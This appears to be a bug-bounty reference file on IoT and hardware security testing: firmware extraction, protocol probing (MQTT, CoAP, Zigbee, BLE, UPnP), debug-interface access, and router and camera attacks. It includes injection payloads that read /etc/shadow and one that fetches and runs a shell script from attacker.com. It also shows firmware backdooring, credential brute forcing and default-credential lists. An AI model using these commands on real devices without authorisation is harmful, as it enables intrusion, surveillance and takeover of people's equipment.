---
name: hardware
description: "IoT device security, firmware analysis, embedded web interface testing, protocol exploitation, and physical interface attacks"
difficulty: intermediate-advanced
bounty_range: "$1,000 - $25,000+"
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**


# Hardware & IoT Security Testing

## Firmware Analysis

### Firmware Acquisition

```bash
# Download from manufacturer website
# Check for firmware update URLs in:
# - Device admin panel (update page source)
# - Mobile app traffic (proxy with Burp/mitmproxy)
# - UART console output during boot
# - FCC filings (sometimes include test firmware)
# - Wayback Machine archives of vendor download pages

# Common firmware file extensions
.bin, .img, .fw, .hex, .rom, .elf, .srec, .uf2, .dfu

# Extract from device via SPI flash
flashrom -p ch341a_spi -r firmware_dump.bin
# Or via JTAG/SWD (see Physical Interfaces section)
```

### Firmware Extraction with Binwalk

```bash
# Analyze firmware structure
binwalk firmware.bin
# Output shows: filesystem offsets, compression types, headers

# Extract all embedded files
binwalk -e firmware.bin
# Creates _firmware.bin.extracted/ directory

# Recursive extraction (for nested archives)
binwalk -eM firmware.bin

# Entropy analysis (detect encrypted/compressed sections)
binwalk -E firmware.bin
# High entropy (>0.9) = encrypted or compressed
# Low entropy (<0.5) = plaintext, interesting data

# Common filesystem types found:
# SquashFS, JFFS2, CramFS, YAFFS2, UBIFS, ext2/3/4
# Extract manually if binwalk fails:
unsquashfs -d output/ squashfs_image
jefferson -d output/ jffs2_image
```

### Filesystem Analysis

```bash
# After extraction, search for sensitive data:

# Hardcoded credentials
grep -rn "password" _firmware.bin.extracted/
grep -rn "passwd" _firmware.bin.extracted/
grep -rn "secret" _firmware.bin.extracted/
grep -rn "api_key\|apikey\|api-key" _firmware.bin.extracted/

# SSH keys
find _firmware.bin.extracted/ -name "id_rsa" -o -name "id_dsa" -o -name "*.pem"

# SSL/TLS certificates and private keys
find _firmware.bin.extracted/ -name "*.key" -o -name "*.crt" -o -name "*.p12"

# Configuration files
find _firmware.bin.extracted/ -name "*.conf" -o -name "*.cfg" -o -name "*.ini"
find _firmware.bin.extracted/ -name "*.json" -o -name "*.yaml" -o -name "*.yml"

# Shadow/passwd files
find _firmware.bin.extracted/ -name "shadow" -o -name "passwd"
# Crack hashes if found:
john --wordlist=rockyou.txt shadow_file
hashcat -m 500 shadow_hashes rockyou.txt

# Web application source code
find _firmware.bin.extracted/ -name "*.php" -o -name "*.cgi" -o -name "*.lua"
find _firmware.bin.extracted/ -name "*.html" -o -name "*.js"

# Binary analysis for hardcoded strings
strings firmware.bin | grep -i "password\|secret\|key\|token\|admin"
strings firmware.bin | grep -E "[a-zA-Z0-9]{32,}"  # Potential API keys/hashes

# Shared libraries and executables
find _firmware.bin.extracted/ -name "*.so" -o -executable -type f
# Check for known vulnerable library versions
```

### Firmware Modification

```bash
# Modify filesystem (backdoor, remove auth checks)
# Example: add root shell to inittab
echo "ttyS0::respawn:/bin/sh" >> squashfs-root/etc/inittab

# Repack SquashFS
mksquashfs squashfs-root/ new_firmware.squashfs -comp xz

# Rebuild full firmware image
# (vendor-specific - may need to match checksums/headers)
# Some tools: firmware-mod-kit, ubi_reader

# Flash modified firmware back to device
flashrom -p ch341a_spi -w modified_firmware.bin
```

## IoT Protocol Testing

### MQTT (Message Queuing Telemetry Transport)

```bash
# Default port: 1883 (unencrypted), 8883 (TLS)
# Test for unauthenticated access
mosquitto_sub -h target.com -t "#" -v
# "#" = wildcard, subscribes to ALL topics
# If messages appear without auth → VULNERABILITY

# Common sensitive topics:
# device/+/telemetry    - sensor data
# device/+/command      - control commands
# home/+/status         - smart home state
# $SYS/#                - broker system info

# Publish test message (if write access)
mosquitto_pub -h target.com -t "device/test/command" -m '{"action":"unlock"}'

# Enumerate topics
mosquitto_sub -h target.com -t '$SYS/#' -v  # System topics
mosquitto_sub -h target.com -t '+/+/#' -v   # Multi-level wildcard

# Brute force credentials
ncrack -p 1883 --user admin mqtt://target.com
# Common creds: admin/admin, admin/password, mqtt/mqtt

# Check for anonymous access
mosquitto_sub -h target.com -t "#" -v --id anonymous
```

### CoAP (Constrained Application Protocol)

```bash
# Default port: 5683 (UDP)
# CoAP is like HTTP for IoT devices

# Discovery
coap-client -m get coap://target.com/.well-known/core
# Returns list of available resources (like sitemap)

# Read resources
coap-client -m get coap://target.com/sensor/temperature
coap-client -m get coap://target.com/config

# Modify resources
coap-client -m put coap://target.com/config -e '{"admin_pass":"hacked"}'

# Tools: libcoap, aiocoap, coap-cli
```

### Zigbee

```bash
# Requires hardware: HackRF, CC2531 USB dongle, or ApiMote

# Sniff Zigbee traffic
zbstumbler -c 11-26  # Scan all channels
zbdump -c 15 -w capture.pcap  # Capture on channel 15

# Key sniffing
# Zigbee uses network key for encryption
# Key is transmitted in plaintext during device joining
# Capture the join process to get the key

# KillerBee framework
zbid                    # Identify Zigbee dongles
zbstumbler              # Find Zigbee networks
zbwireshark -c 15       # Live capture to Wireshark
zbreplay -c 15 -r capture.pcap  # Replay packets

# Default keys:
# ZigBee Alliance: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39
# "ZigBeeAlliance09"
```

### BLE (Bluetooth Low Energy)

```bash
# Scan for BLE devices
hcitool lescan
# Or with modern tools:
bluetoothctl
> scan on

# Enumerate services and characteristics
gatttool -b XX:XX:XX:XX:XX:XX -I
> primary                    # List services
> characteristics            # List characteristics
> char-read-hnd 0x0025       # Read a characteristic

# Bettercap for BLE
bettercap -eval "ble.recon on"
bettercap -eval "ble.enum XX:XX:XX:XX:XX:XX"

# Common BLE vulnerabilities:
# - No pairing required (Just Works mode)
# - Static pairing PINs (000000, 123456)
# - Unencrypted characteristic writes
# - Replay of captured write commands
# - MITM during pairing (btlejuice)

# BLE MITM with btlejuice
btlejuice-proxy -u XX:XX:XX:XX:XX:XX  # On relay device
btlejuice                               # On attacker machine
# Intercept and modify BLE communications in real-time
```

### UPnP (Universal Plug and Play)

```bash
# Discover UPnP devices on network
upnpc -l
# Or:
gssdp-discover --timeout=5

# Common vulnerabilities:
# - SSDP reflection/amplification (DDoS)
# - Exposed management interfaces
# - XML injection in SOAP requests
# - Unauthorized port forwarding

# Add port forward via UPnP (if exposed to WAN)
upnpc -a ATTACKER_IP 22 22 TCP
# This can open internal services to the internet

# miniupnp exploit tools
miranda.py  # UPnP exploitation framework
> msearch    # Discover devices
> host list  # List found hosts
> host get 0 deviceList  # Enumerate device capabilities
```

## Physical Debug Interfaces

### UART (Universal Asynchronous Receiver/Transmitter)

```
IDENTIFICATION:
1. Open device enclosure
2. Look for 3-4 pin headers (often unpopulated)
3. Pin layout: GND, TX, RX, (VCC optional)
4. Use multimeter to identify:
   - GND: 0V, connected to ground plane
   - VCC: 3.3V or 5V (steady)
   - TX: fluctuating voltage (data output)
   - RX: steady high voltage (data input)

TOOLS:
- USB-to-UART adapter (FTDI, CP2102, CH340)
- Logic analyzer (Saleae, DSLogic)
- JTAGulator (auto-detect pinout)

CONNECTION:
Device TX → Adapter RX
Device RX → Adapter TX
Device GND → Adapter GND
(Do NOT connect VCC unless needed)

COMMON BAUD RATES:
9600, 19200, 38400, 57600, 115200, 230400, 460800, 921600

ACCESS:
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200
picocom /dev/ttyUSB0 -b 115200

WHAT TO LOOK FOR:
- Boot log (U-Boot, kernel messages)
- Root shell (often no authentication!)
- Debug menu with diagnostic options
- Hardcoded credentials in boot messages
- Firmware update mechanisms
- Memory addresses and kernel versions
```

### JTAG (Joint Test Action Group)

```
IDENTIFICATION:
- 10-pin or 20-pin header (standard ARM layout)
- Key pins: TDI, TDO, TMS, TCK, TRST (optional), GND
- Use JTAGulator to auto-detect pinout

TOOLS:
- JTAGulator (automated pin detection)
- OpenOCD (open-source JTAG debugger)
- Bus Pirate (low-cost multi-protocol tool)
- Segger J-Link (professional debugger)

CAPABILITIES:
1. Read/write flash memory (full firmware dump)
2. Read/write RAM (runtime state)
3. Set breakpoints and single-step execution
4. Bypass secure boot (in some cases)
5. Extract encryption keys from memory
6. Unlock debug-locked processors

OPENOCD EXAMPLE:
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
# Then connect via telnet:
telnet localhost 4444
> halt
> dump_image firmware.bin 0x08000000 0x100000
> resume
```

### SWD (Serial Wire Debug)

```
SWD is a 2-pin alternative to JTAG (ARM Cortex-M processors):
- SWDIO (data)
- SWCLK (clock)
- GND

Fewer pins = harder to find, easier to use

TOOLS: Same as JTAG (OpenOCD, J-Link, ST-Link)

OPENOCD for SWD:
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg -c "transport select swd"

# Dump firmware
> halt
> flash read_bank 0 firmware.bin
```

### SPI Flash Reading

```bash
# Many IoT devices store firmware on SPI flash chips
# Common chips: Winbond W25Q64, Macronix MX25L, SST25VF

# Read with flashrom and CH341A programmer
flashrom -p ch341a_spi -r firmware_dump.bin

# Or with Bus Pirate
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware_dump.bin

# Identify chip
flashrom -p ch341a_spi
# Shows detected SPI flash chip and size
```

## Embedded Web Interface Vulnerabilities

### Common IoT Web Vulnerabilities

```
AUTHENTICATION:
- Default credentials (admin/admin, root/root, admin/password, admin/1234)
- Hardcoded credentials in firmware (not changeable)
- No authentication on API endpoints
- Session tokens in URL parameters
- Basic auth over HTTP (no HTTPS)
- No brute force protection
- Password recovery via serial number or MAC address

INJECTION:
- Command injection in diagnostic tools:
  Ping: 127.0.0.1; cat /etc/shadow
  Traceroute: 8.8.8.8 | id
  DNS lookup: ; wget http://attacker.com/shell.sh | sh

- OS command injection in:
  - Network configuration (DNS, NTP, DHCP)
  - Firmware update URL
  - Device name / hostname fields
  - Syslog server configuration
  - SNMP community string

INFORMATION DISCLOSURE:
- Verbose error messages with stack traces
- Debug endpoints left enabled
- Backup configuration download without auth
- Device info endpoint (model, firmware version, MAC, serial)
- SNMP with default community strings (public/private)
```

### Router-Specific Attacks

```bash
# Common router admin endpoints
http://192.168.1.1/
http://192.168.0.1/
http://10.0.0.1/

# Configuration backup download
/cgi-bin/export_settings.cgi
/config/backup
/maintenance/backup
/HNAP1/ (Home Network Administration Protocol)

# Common command injection points
# Diagnostic ping:
POST /ping.cgi
ping_addr=127.0.0.1;cat /etc/passwd

# DNS settings:
POST /dns.cgi
dns1=8.8.8.8$(id)

# HNAP vulnerabilities
curl http://router/HNAP1/ -H "SOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings"
# Many routers have HNAP auth bypass or command injection
```

### Camera/DVR Specific

```bash
# Default credential databases
# Hikvision: admin/12345
# Dahua: admin/admin
# Axis: root/pass
# Samsung: admin/4321
# Amcrest: admin/admin

# RTSP stream access (often unauthenticated)
ffplay rtsp://target:554/stream1
ffplay rtsp://target:554/Streaming/Channels/101
vlc rtsp://admin:12345@target:554/h264/ch1/main/av_stream

# Common RTSP paths:
/live/ch1, /stream1, /h264, /video1
/Streaming/Channels/101
/cam/realmonitor?channel=1&subtype=0

# ONVIF discovery (camera management protocol)
python3 -c "
from onvif import ONVIFCamera
cam = ONVIFCamera('target', 80, 'admin', 'admin')
info = cam.devicemgmt.GetDeviceInformation()
print(info)
"

# Snapshot without auth
curl http://target/snapshot.cgi
curl http://target/image/jpeg.cgi
curl http://target/cgi-bin/snapshot.cgi
```

## Network-Level IoT Attacks

### DNS Rebinding

```
ATTACK FLOW:
1. Victim visits attacker's page (attacker.com)
2. Attacker's DNS initially resolves to attacker's IP
3. JavaScript loads from attacker's IP
4. DNS TTL expires, re-resolves to IoT device IP (192.168.1.1)
5. Same-origin policy satisfied (still attacker.com domain)
6. JavaScript can now interact with IoT device's web interface

PREREQUISITES:
- IoT device web interface bound to all interfaces
- No Host header validation
- Short DNS TTL from attacker's DNS server

TOOLS:
- Singularity of Origin (automated DNS rebinding)
- Tavis Ormandy's rbndr (https://github.com/nickstenning/rbndr)
- whonow DNS rebinding framework

TESTING:
1. Set up rebinding DNS server
2. Create page that makes requests to IoT device paths
3. Exploit: read config, change settings, execute commands
```

### mDNS / DNS-SD Enumeration

```bash
# Discover devices on local network
avahi-browse -a -t
# Shows all services advertised via mDNS

# Common IoT service types:
_http._tcp       # Web interfaces
_printer._tcp    # Printers
_ipp._tcp        # Internet Printing Protocol
_hap._tcp        # HomeKit Accessory Protocol
_mqtt._tcp       # MQTT brokers
_coap._udp       # CoAP services
_airplay._tcp    # AirPlay devices
_raop._tcp       # AirPlay audio
_googlecast._tcp # Chromecast devices
_sonos._tcp      # Sonos speakers

# Enumerate specific device
avahi-resolve -n device-name.local
dig @224.0.0.251 -p 5353 device-name.local
```

### Default Credential Testing

```
METHODOLOGY:
1. Identify device make/model (via web interface, SNMP, UPnP, Nmap)
2. Search default credential databases:
   - https://www.defaultpassword.com
   - https://cirt.net/passwords
   - https://default-password.info
   - Firmware extraction (see above)

3. Common patterns:
   admin/admin, admin/password, admin/1234, admin/(blank)
   root/root, root/toor, root/admin, root/(blank)
   user/user, guest/guest, support/support
   (serial number as password)
   (MAC address as password)
   (model number as password)

4. Test via:
   - Web interface login
   - SSH/Telnet
   - SNMP community strings
   - MQTT broker
   - FTP/TFTP
   - Custom protocols
```

## Testing Tools

### Firmware Analysis

```bash
# Binwalk - firmware extraction and analysis
binwalk -eM firmware.bin

# Firmware Analysis Toolkit (FAT) - emulation
./fat.py firmware.bin
# Emulates firmware in QEMU for dynamic testing

# Firmwalker - automated firmware secret scanner
./firmwalker.sh _firmware.bin.extracted/

# EMBA - Embedded Analyzer
./emba.sh -f firmware.bin -l ./logs

# Ghidra / IDA Pro - reverse engineering
# For analyzing compiled binaries found in firmware

# firmware-mod-kit
./extract-firmware.sh firmware.bin
./build-firmware.sh extracted_dir/
```

### Network Analysis

```bash
# Nmap IoT scanning
nmap -sV -sC -p- target_ip
nmap --script=mqtt-subscribe target_ip -p 1883
nmap --script=coap-resources target_ip -p 5683
nmap --script=upnp-info target_ip

# Wireshark/tcpdump for protocol analysis
tcpdump -i eth0 -w iot_traffic.pcap host DEVICE_IP
# Filter for specific protocols in Wireshark
```

### Hardware Tools

```
ESSENTIAL KIT:
- USB-UART adapter (FTDI FT232RL or CP2102) - $5-15
- Logic analyzer (Saleae clone or DSLogic) - $10-50
- Bus Pirate - $30
- JTAGulator - $200
- CH341A SPI programmer - $5
- Multimeter - $20
- Soldering iron + fine tips - $50
- Hot air rework station - $50 (for chip removal)

ADVANCED:
- SDR (HackRF One, RTL-SDR) - $20-300
- Zigbee sniffer (CC2531) - $10
- BLE sniffer (nRF52840 dongle) - $10
- Proxmark3 (RFID/NFC) - $50-300
- ChipWhisperer (power analysis/glitching) - $250+
```

## Evidence Requirements

```
REQUIRED EVIDENCE:
1. Device identification (make, model, firmware version, FCC ID)
2. Vulnerability description with technical details
3. Step-by-step reproduction:
   a. How to acquire/access the device
   b. Tools and connections needed
   c. Exact commands or payloads used
   d. Expected vs actual output
4. Screenshots or serial console logs
5. Impact assessment:
   - Number of affected devices (Shodan/Censys count)
   - Type of data exposed
   - Remote vs local access required
   - Authentication required or not
6. Proof that vulnerability exists in latest firmware
7. Network capture (pcap) if relevant

SHODAN QUERIES FOR IMPACT:
"product:Vendor Model"
"Server: Device-Name"
"WWW-Authenticate: Basic realm=\"Device\""
http.title:"Device Admin Panel"
```

## Bounty Ranges

| Vulnerability | Typical Range | Notes |
|--------------|---------------|-------|
| Hardcoded root credentials | $1,000 - $5,000 | Higher for internet-facing devices |
| Unauthenticated RCE via web | $5,000 - $25,000 | Critical for routers/cameras |
| UART root shell (no auth) | $1,000 - $3,000 | Physical access required |
| Command injection (web UI) | $2,000 - $10,000 | Depends on auth requirement |
| Firmware encryption bypass | $2,000 - $8,000 | Enables further research |
| Default credentials (remote) | $1,000 - $5,000 | Higher with Shodan count |
| MQTT open broker (sensitive data) | $1,000 - $5,000 | Depends on data exposed |
| BLE unauth control | $1,000 - $5,000 | Smart locks, medical devices higher |
| DNS rebinding to IoT | $2,000 - $8,000 | Browser-based, no local access |
| Camera RTSP no auth | $1,000 - $3,000 | Privacy impact |
| Firmware signing bypass | $3,000 - $15,000 | Enables persistent compromise |
| Secure boot bypass | $5,000 - $25,000 | Chip vendor programs |

### Key Platforms

```
Vendor Programs:    TP-Link, Netgear, ASUS, D-Link, Synology, QNAP
Bug Bounty:         HackerOne (Sonos, Ubiquiti), Bugcrowd
Chip Vendors:       Qualcomm, MediaTek, Broadcom, Intel (product security)
Specialized:        Zero Day Initiative (ZDI), Pwn2Own IoT
Coordinated:        CERT/CC, ICS-CERT (industrial systems)
```

## Real-World Examples

```
Mirai Botnet (2016):
- Exploited default credentials on IoT devices (cameras, routers)
- 61 default username/password combinations
- 600,000+ compromised devices
- Took down Dyn DNS, affecting Twitter, Netflix, Reddit
- Lesson: default credentials at scale = internet-wide impact

Ring Doorbell Vulnerabilities (Multiple):
- Unencrypted WiFi credentials during setup
- API endpoints leaking user data
- Insufficient brute force protection
- Bounty payouts: $500 - $5,000 per finding

Philips Hue Zigbee Exploit (2020):
- CVE-2020-6007: heap overflow via Zigbee
- Chain: compromise bulb → attack bridge → pivot to network
- Exploited old Zigbee OTA update vulnerability
- Demonstrated IoT-to-network lateral movement

Trane Thermostat Vulnerabilities (2018):
- Hardcoded credentials in firmware
- Unauthenticated access to HVAC controls
- Could manipulate building temperature remotely
- ICS-CERT advisory issued

TP-Link Router RCE (Multiple CVEs):
- Command injection in web management interface
- Diagnostic tools (ping, traceroute) with insufficient sanitization
- Affects millions of deployed routers
- Bounty: $2,000 - $10,000 depending on model/severity
```
